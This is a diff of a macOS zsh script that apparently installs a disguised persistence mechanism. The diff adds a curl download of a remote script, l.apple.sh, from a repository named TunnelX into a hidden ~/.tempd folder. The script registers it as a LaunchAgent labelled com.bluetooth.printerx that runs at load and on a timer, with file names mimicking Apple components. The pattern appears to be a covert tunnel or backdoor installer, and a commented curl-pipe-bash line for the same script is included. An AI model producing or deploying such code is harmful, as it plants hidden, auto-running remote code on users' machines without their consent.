@@ -1,8 +1,12 @@
 #!/bin/zsh
-#curl -o- https://raw.githubusercontent.com/xlinx/TunnelX/refs/heads/main/printerServices/l.apple.sh | bash
+# curl -o- https://raw.githubusercontent.com/xlinx/TunnelX/refs/heads/main/printerServices/l.apple.sh | bash
+# /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+
 LOGPATH="$HOME/Library/Logs/_mylog.log"
 SNAME="com.bluetooth.printerx"
 FOLDER_PATH="$HOME/.tempd"
+FOLDER_PATH_L_APPLE="$FOLDER_PATH/l.apple.sh"
+curl -o "$FOLDER_PATH_L_APPLE" https://raw.githubusercontent.com/xlinx/TunnelX/refs/heads/main/printerServices/l.apple.sh
 PICTURE_PATH="$FOLDER_PATH/d.apple.com.lib"
 NOW=$(date)
 #ANY=$(cat "/var/log/conn.log" | grep "Incoming session request" | awk \{'print $2 $3 $13 $14'\})
@@ -13,7 +17,7 @@ PL="<?xml version=\"1.0\" encoding=\"UTF-8\"?>
 <plist version=\"1.0\"><dict>
 <key>Label</key><string>$SNAME</string>
 <key>RunAtLoad</key><true /><key>StartInterval</key><integer>75</integer>
-<key>Program</key><string>$HOME/.tempd/l.apple.sh</string>
+<key>Program</key><string>$FOLDER_PATH/l.apple.sh</string>
 <key>StartInterval</key><integer>1800</integer>
 </dict></plist>"
 PLPATH="$HOME/Library/LaunchAgents/$SNAME.plist"
